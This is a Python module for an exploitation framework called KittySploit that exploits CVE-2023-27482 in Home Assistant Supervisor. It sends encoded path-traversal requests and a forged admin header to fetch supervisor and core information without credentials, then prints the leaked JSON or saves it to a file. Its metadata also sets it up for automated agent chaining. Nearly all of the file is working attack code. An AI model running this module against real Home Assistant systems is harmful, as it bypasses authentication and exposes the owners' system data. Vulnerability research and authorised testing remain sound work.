#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Home Assistant Supervisor auth bypass info leak (CVE-2023-27482)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'Home Assistant - Supervisor Auth Bypass Info Leak (CVE-2023-27482)',
        'description': (
            'Uses CVE-2023-27482 path-traversal auth bypass to fetch supervisor/core JSON '
            'info without credentials. Does not open a shell session.'
        ),
        'author': ['KittySploit Team'],
        'cve': ['CVE-2023-27482'],
        'platform': Platform.MULTI,
        'references': [
            'https://github.com/elttam/publications/blob/master/writeups/home-assistant/supervisor-authentication-bypass-advisory.md',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-27482',
        ],
        'tags': ['home-assistant', 'auth-bypass', 'exposure', 'unauth', 'cve-2023-27482'],
        'agent': {
            'risk': 'intrusive',
            'effects': ['data_exfiltration'],
            'expected_requests': 3,
            'reversible': True,
            'approval_required': True,
            'produces': ['risk_signals'],
            'cost': 1.2,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'admin_surface', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['scanner/http/cve_2023_27482_detect'],
            },
        },
    }

    base_path = OptString('', 'Optional Home Assistant base path prefix', required=False)
    output_file = OptString('', 'Local file to write leaked JSON', required=False)
    output_limit = OptInteger(
        12000,
        'Max chars to print when output_file empty (0=full)',
        required=False,
        advanced=True,
    )

    def _prefix(self) -> str:
        base = str(self.base_path or '').strip()
        if not base or base == '/':
            return ''
        if not base.startswith('/'):
            base = '/' + base
        return base.rstrip('/')

    def run(self):
        prefix = self._prefix()
        probes = (
            (f'{prefix}/api/hassio/app/.%252e/core/info', None),
            (f'{prefix}/api/hassio/app/.%252e/supervisor/info', None),
            (f'{prefix}/api/hassio_ingress/.%09./supervisor/info', {'X-Hass-Is-Admin': '1'}),
        )
        for path, headers in probes:
            print_status(f'Probing {path} ...')
            r = self.http_request(
                method='GET',
                path=path,
                headers=headers,
                allow_redirects=False,
            )
            if not r or r.status_code != 200:
                continue
            body = r.text or ''
            if '"result"' not in body or '"ok"' not in body:
                continue
            print_success(f'Auth bypass confirmed via {path}')
            out = str(self.output_file or '').strip()
            if out:
                with open(out, 'w', encoding='utf-8', errors='replace') as fh:
                    fh.write(body)
                print_success(f'Wrote leak to {out}')
            else:
                limit = int(self.output_limit or 0)
                print_info(body if limit <= 0 else body[:limit])
            return True
        print_error('No bypass path succeeded')
        return False
